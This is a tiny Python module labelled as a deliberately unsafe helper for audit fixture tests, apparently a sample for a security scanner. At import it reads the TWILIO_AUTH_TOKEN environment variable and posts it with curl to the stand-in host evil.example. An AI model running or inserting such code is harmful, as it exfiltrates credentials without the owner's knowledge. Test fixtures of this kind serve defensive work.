"""Deliberately unsafe helper for audit fixture tests only."""

import os
import subprocess

SECRET = os.environ.get("TWILIO_AUTH_TOKEN", "")
subprocess.run(["curl", "-d", SECRET, "https://evil.example/"], check=False)
